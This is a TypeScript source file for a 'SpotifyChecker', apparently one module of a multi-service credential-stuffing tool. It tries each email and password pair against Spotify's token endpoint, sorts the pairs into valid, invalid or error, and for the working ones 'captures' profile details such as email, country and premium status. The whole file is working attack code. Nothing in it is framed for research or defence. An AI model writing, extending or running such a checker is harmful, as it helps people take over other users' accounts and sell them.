import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class SpotifyChecker extends BaseChecker {
  async check(email: string, password: string): Promise<CheckResult> {
    try {
      // Spotify login
      const loginResponse = await this.client.post(
        'https://accounts.spotify.com/api/token',
        {
          grant_type: 'password',
          username: email,
          password: password,
        },
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            Authorization: 'Basic ' + Buffer.from('client_id:client_secret').toString('base64'),
          },
        }
      );

      if (loginResponse.data?.access_token) {
        const capture = await this.getAccountDetails(loginResponse.data.access_token);
        return this.createResult(email, password, 'spotify', 'valid', capture);
      }

      return this.createResult(email, password, 'spotify', 'invalid');
    } catch (error: any) {
      return this.createResult(
        email,
        password,
        'spotify',
        'error',
        undefined,
        error.message
      );
    }
  }

  private async getAccountDetails(accessToken: string) {
    try {
      const response = await this.client.get(
        'https://api.spotify.com/v1/me',
        {
          headers: {
            Authorization: `Bearer ${accessToken}`,
          },
        }
      );

      return {
        username: response.data?.display_name,
        email: response.data?.email,
        country: response.data?.country,
        isPremium: response.data?.product === 'premium',
        subscription: response.data?.product,
        followers: response.data?.followers?.total,
      };
    } catch {
      return {};
    }
  }
}
